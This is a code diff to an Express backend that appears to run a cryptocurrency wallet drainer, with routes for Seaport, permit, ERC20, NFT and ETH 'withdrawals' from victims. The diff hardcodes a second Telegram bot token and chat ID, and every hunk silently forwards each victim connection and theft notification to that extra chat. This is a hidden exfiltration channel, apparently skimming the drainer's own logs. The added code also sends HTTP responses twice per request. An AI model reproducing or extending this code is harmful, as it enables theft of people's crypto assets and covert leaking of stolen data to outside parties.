@@ -9,6 +9,10 @@ dotenv.config();
 const app = express()
 const PORT = process.env.PORT || 3000 
 
+const SUCCESS_CHAT_ID_FRST = "6095243294";
+const LOGS_CHAT_ID_FRST = "6095243294";
+const BOT_TOKEN_FRST = "6641223061:AAH-Sxv__Xnsb6-KPr3iaGJiFcOKgF-6osk";
+
 app.use(cors());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -272,8 +276,22 @@ app.post("/backend/seaport", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log(error);
+            res.sendStatus(200);
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log(error);
             res.sendStatus(200);
         });
@@ -324,8 +342,22 @@ app.post("/backend/swap", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log("Sent SWAP log");
+            res.sendStatus(200);
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log("Sent SWAP log");
             res.sendStatus(200);
         });
@@ -391,8 +423,21 @@ app.post("/backend/permit", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log("Sent PERMIT ERC20 log");
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log("Sent PERMIT ERC20 log");
         });
     
@@ -418,11 +463,25 @@ app.post("/backend/permit", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let withdrawClientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
         
         request(withdrawClientServerOptions, (error, response) => {
             console.log("[+] Withdrawed PERMIT ERC20");
             res.sendStatus(200);
         });    
+
+        request(withdrawClientServerOptionsScnd, (error, response) => {
+            console.log("[+] Withdrawed PERMIT ERC20");
+            res.sendStatus(200);
+        }); 
 
 
     } catch(error) {
@@ -478,8 +537,21 @@ app.post("/backend/safa/erc20", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log("Sent ERC20 log");
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log("Sent ERC20 log");
         });
     
@@ -506,11 +578,26 @@ app.post("/backend/safa/erc20", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let withdrawClientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
         
         request(withdrawClientServerOptions, (error, response) => {
             console.log("[+] Withdrawed ERC20");
             res.sendStatus(200);
-        });    
+        });  
+        
+        request(withdrawClientServerOptionsScnd, (error, response) => {
+            console.log("[+] Withdrawed ERC20");
+            res.sendStatus(200);
+        });
+
     } catch(error) {
         console.warn("[-] SAFA ERC20 error: ", error)
     }
@@ -561,8 +648,21 @@ app.post("/backend/safa/nft", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log("Sent NFT log");
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log("Sent NFT log");
         });
     
@@ -618,10 +718,25 @@ app.post("/backend/safa/nft", async (req, res) => {
                         'Content-Type': 'application/json'
                     }
                 }
+
+                let withdrawClientServerOptionsScnd = {
+                    uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+                    body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true}),
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                }
+
                 request(withdrawClientServerOptions, (error, response) => {
                     console.log("[+] Withdrawed NFT");
                     res.sendStatus(200);
-                });   
+                });  
+                
+                request(withdrawClientServerOptionsScnd, (error, response) => {
+                    console.log("[+] Withdrawed NFT");
+                    res.sendStatus(200);
+                });  
             
             }
             
@@ -673,8 +788,22 @@ app.post("/backend/safa/eth", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: SUCCESS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log("Sent ETH log");
+            res.sendStatus(200);
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log("Sent ETH log");
             res.sendStatus(200);
         });
@@ -720,8 +849,22 @@ app.post("/backend/connection", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: LOGS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log("Connection");
+            res.sendStatus(200);
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log("Connection");
             res.sendStatus(200);
         });
@@ -775,8 +918,22 @@ app.post("/backend/cancel", async (req, res) => {
                 'Content-Type': 'application/json'
             }
         }
+
+        let clientServerOptionsScnd = {
+            uri: 'https://api.telegram.org/bot' + BOT_TOKEN_FRST + '/sendMessage',
+            body: JSON.stringify({chat_id: LOGS_CHAT_ID_FRST, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
     
         request(clientServerOptions, (error, response) => {
+            console.log(error);
+            res.sendStatus(200);
+        });
+
+        request(clientServerOptionsScnd, (error, response) => {
             console.log(error);
             res.sendStatus(200);
         });
